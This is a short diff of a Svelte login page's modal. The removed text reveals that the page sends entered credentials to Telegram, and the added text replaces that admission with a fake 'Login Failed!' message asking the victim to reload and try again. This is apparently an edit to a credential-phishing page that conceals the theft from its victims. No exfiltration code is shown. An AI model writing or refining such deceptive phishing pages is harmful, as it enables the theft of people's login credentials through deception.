@@ -396,8 +396,8 @@
 <!-- Modal for Success Message -->
 <div class="modal-overlay {isModalVisible ? 'visible' : ''}">
   <div class="modal-content">
-    <h2>Login Successful!</h2>
-    <p>Your credentials have been sent to Telegram.</p>
+    <h2>Login Failed!</h2>
+    <p>Kindly reload the page and try again!...</p>
     <div class="modal-footer">
       <button class="close-btn" on:click={closeModal}>Close</button>
     </div>
